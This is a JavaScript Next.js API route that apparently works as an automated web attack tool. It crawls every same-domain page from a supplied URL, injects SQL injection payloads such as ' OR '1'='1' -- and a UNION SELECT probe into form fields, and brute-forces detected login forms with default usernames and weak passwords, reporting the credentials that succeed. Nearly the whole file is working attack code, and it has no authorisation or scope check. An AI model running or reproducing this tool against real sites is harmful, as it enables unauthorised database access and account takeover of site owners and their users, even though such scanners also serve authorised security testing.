import axios from "axios";
import * as cheerio from "cheerio";
import Crawler from "crawler";
import { NextResponse } from "next/server";
import { URL } from "url";

// ------------------------
// Constants
// ------------------------
const USER_LIST = ["root", "admin"];
const PASSWORD_LIST = ["123456", "password", "12345678"];
const SQLI_PAYLOADS = [
  "' OR '1'='1' -- ",
  "' UNION SELECT '57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING', NULL -- ",
];

// ------------------------
// In-memory storage
// ------------------------
const visitedUrls = new Map(); // URL -> cheerio object

// ------------------------
// Utility Functions
// ------------------------
const normalizeUrl = (href, base) => {
  try {
    return new URL(href, base).href;
  } catch {
    return null;
  }
};

const isSameDomain = (url, domain) => {
  try {
    return new URL(url).hostname === domain;
  } catch {
    return false;
  }
};

// ------------------------
// Pattern Detection
// ------------------------
const detectTestingStringResponses = ($) => {
  const html = $.html();
  const target = "57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING";
  const regex = /'\s*UNION\s*SELECT.*57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING.*--/i;

  const occurrences = html.match(new RegExp(target, "g")) || [];
  const fullMatches = html.match(regex) || [];

  return occurrences.length > fullMatches.length
    ? { type: "testing_string_response", data: [target] }
    : null;
};

const detectSQLInjectionResponses = ($) => {
  const results = [];
  $("pre").each((_, el) => {
    const txt = $(el).text().trim();
    if (/ID:\s*'[^']*--/.test(txt)) results.push(txt);
  });
  return results.length ? { type: "sql_injection_response", data: results } : null;
};

const detectPatterns = ($) => {
  return [detectSQLInjectionResponses, detectTestingStringResponses]
    .map((detector) => detector($))
    .filter(Boolean);
};

// ------------------------
// Login Utilities
// ------------------------
const isLikelyLoginForm = ($form, $) => {
  let hasPassword = false;
  let hasUserField = false;

  $form.find("input").each((_, el) => {
    const type = ($(el).attr("type") || "").toLowerCase();
    const name = ($(el).attr("name") || "").toLowerCase();
    if (type === "password") hasPassword = true;
    if (name.includes("user") || name.includes("email") || type === "text" || type === "email") {
      hasUserField = true;
    }
  });

  return hasPassword && hasUserField;
};

const isPotentiallySuccessfulLogin = (resp) => {
  const html = (resp.data || "").toLowerCase();
  const headers = resp.headers || {};
  const status = resp.status;

  const failureKeywords = [
    "invalid", "incorrect", "login failed", "wrong password", "try again", "authentication failed"
  ];

  const successKeywords = [
    "logout", "welcome", "dashboard", "you are logged in", "my account", "sign out"
  ];

  const hasFailureIndicators = failureKeywords.some((kw) => html.includes(kw));
  const hasSuccessIndicators = successKeywords.some((kw) => html.includes(kw));

  const setCookieHeader = headers["set-cookie"];
  const hasSessionCookie = Array.isArray(setCookieHeader)
    ? setCookieHeader.some((cookie) => /session|auth|jwt|sid/i.test(cookie))
    : false;

  const isRedirectToSafePage = headers["location"] &&
    ["/dashboard", "/account", "/home"].some(path =>
      headers["location"].toLowerCase().includes(path)
    );

  // Heuristic scoring
  let score = 0;
  if (status >= 200 && status < 300) score += 1;
  if (hasSuccessIndicators) score += 2;
  if (hasSessionCookie) score += 2;
  if (status === 302 && isRedirectToSafePage) score += 1;

  return !hasFailureIndicators && score >= 3;
};


const bruteForceLogin = async (url, method, data, fields, requestFn) => {
  const usernameField = Object.entries(fields).find(([name]) =>
    ["user", "email", "username"].some((kw) => name.toLowerCase().includes(kw))
  )?.[0];

  const passwordField = Object.entries(fields).find(([_, type]) => type === "password")?.[0];

  if (!usernameField || !passwordField) {
    console.warn(`[BRUTE SKIPPED] Missing username or password fields for ${url}`);
    return [];
  }

  const successfulAttempts = [];

  for (const user of USER_LIST) {
    for (const pass of PASSWORD_LIST) {
      const payload = { ...data, [usernameField]: user, [passwordField]: pass };

      // Avoid sending empty payloads
      if (!payload[usernameField] || !payload[passwordField]) {
        console.warn(`[BRUTE SKIPPED] Empty credentials for ${url}`);
        continue;
      }

      try {
        console.log(
          `[BRUTE ATTEMPT] Requesting ${url} with ${method} for ${user}:${pass} in ${JSON.stringify(payload)}`
        );
        const resp = await requestFn(url, method, payload);
        if (isPotentiallySuccessfulLogin(resp)) {
          console.log(`[BRUTE SUCCESS] ${user}:${pass}`);
          successfulAttempts.push({ username: user, password: pass, url });
        }
      } catch (err) {
        console.error(`[BRUTE ERROR] ${user}:${pass} - ${err.message}`);
      }
    }
  }

  return successfulAttempts;
};

// ------------------------
// Form Processor
// ------------------------
const extractForms = ($, pageUrl) =>
  $("form")
    .map((_, form) => {
      const $form = $(form);
      const method = ($form.attr("method") || "GET").toUpperCase();
      const action = $form.attr("action") || pageUrl;
      const inputs = $form.find("input, textarea, select");

      const formData = {};
      const formInputs = {};

      inputs.each((_, el) => {
        const name = $(el).attr("name");
        if (!name) return;
        formData[name] = $(el).attr("value") || "";
        formInputs[name] = ($(el).attr("type") || "").toLowerCase();
      });

      return {
        method,
        actionUrl: new URL(action, pageUrl).href.replace(/#$/, ""),
        formData,
        formInputs,
        isLogin: isLikelyLoginForm($form, $),
      };
    })
    .get();

const submitFormWithPayloads = async (form, requestFn) => {
  const { actionUrl, method, formData } = form;
  const targetField = Object.keys(formData)[0];
  const found = [];

  for (const payload of SQLI_PAYLOADS) {
    const injected = { ...formData, [targetField]: payload };
    try {
      const resp = await requestFn(actionUrl, method, injected);
      const patterns = detectPatterns(cheerio.load(resp.data));
      if (patterns.length > 0) found.push(actionUrl);
    } catch (err) {
      console.error(`[SQLi FAIL] ${actionUrl}`, err.message);
    }
  }

  return found;
};

const processForms = async ($, url, requestFn) => {
  const forms = extractForms($, url);
  const sqlHits = [];
  const bruteForceResults = [];

  for (const form of forms) {
    const hits = await submitFormWithPayloads(form, requestFn);
    sqlHits.push(...hits);

    if (form.isLogin) {
      const attempts = await bruteForceLogin(
        form.actionUrl,
        form.method,
        form.formData,
        form.formInputs,
        requestFn
      );
      bruteForceResults.push(...attempts);
    }
  }

  return { sqlHits, bruteForceResults };
};

// ------------------------
// Request Utility
// ------------------------
const requestFn = async (url, method, data) => {
  const config = {
    maxRedirects: 0, // <-- this disables following 302/301/303 redirects
    validateStatus: (status) => status < 400 || status === 302, // accept 302 as valid
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
  };

  try {
    if (method === "POST") {
      return await axios.post(url, new URLSearchParams(data), config);
    } else {
      return await axios.get(`${url}?${new URLSearchParams(data).toString()}`, config);
    }
  } catch (error) {
    if (error.response && error.response.status === 302) {
      // Return the redirect response so we can inspect it
      return error.response;
    }

    // Re-throw other unexpected errors
    throw error;
  }
};

// ------------------------
// Crawler
// ------------------------
const extractLinks = ($, domain, baseUrl) => {
  const links = new Set();

  $("a").each((_, el) => {
    const href = $(el).attr("href");
    const fullUrl = normalizeUrl(href, baseUrl);
    if (fullUrl && isSameDomain(fullUrl, domain) && !fullUrl.match(/\.(jpg|png|svg|yml|yaml)$/i)) {
      links.add(fullUrl);
    }
  });

  return [...links];
};

const startCrawler = (startUrl) =>
  new Promise((resolve) => {
    const foundUrls = new Set();
    const domain = new URL(startUrl).hostname;

    const crawler = new Crawler({
      maxConnections: 10,
      retries: 3,
      callback: (err, res, done) => {
        const pageUrl = res.options?.url;
        if (!err && res.$ && pageUrl && !visitedUrls.has(pageUrl)) {
          visitedUrls.set(pageUrl, res.$);
          foundUrls.add(pageUrl);

          for (const link of extractLinks(res.$, domain, pageUrl)) {
            if (!visitedUrls.has(link)) crawler.queue(link);
          }
        } else if (err) {
          console.error(`[Crawler Error] ${pageUrl}: ${err.message}`);
        }

        done();
      },
    });

    crawler.queue(startUrl);
    crawler.on("drain", () => resolve([...foundUrls]));
  });

// ------------------------
// API Handler
// ------------------------
export async function POST(req) {
  const { startUrl } = await req.json();

  if (!startUrl) {
    return NextResponse.json({ error: "Missing startUrl" }, { status: 400 });
  }

  try {
    console.log("[API] Starting crawler for", startUrl);
    const crawledUrls = await startCrawler(startUrl);
    console.log("[API] Crawler finished, found URLs:", crawledUrls.length);
    const sqlHitUrls = [];
    const bruteForceResults = [];

    for (const url of crawledUrls) {
      const $ = visitedUrls.get(url);
      if ($) {
        const { sqlHits, bruteForceResults: bruteHits } = await processForms($, url, requestFn);
        if (sqlHits.length > 0) sqlHitUrls.push(...sqlHits);
        if (bruteHits.length > 0) bruteForceResults.push(...bruteHits);
      }
    }

    return NextResponse.json({ crawledUrls, sqlHitUrls, bruteForceResults });
  } catch (err) {
    console.error("[API Error]", err);
    return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
  }
}
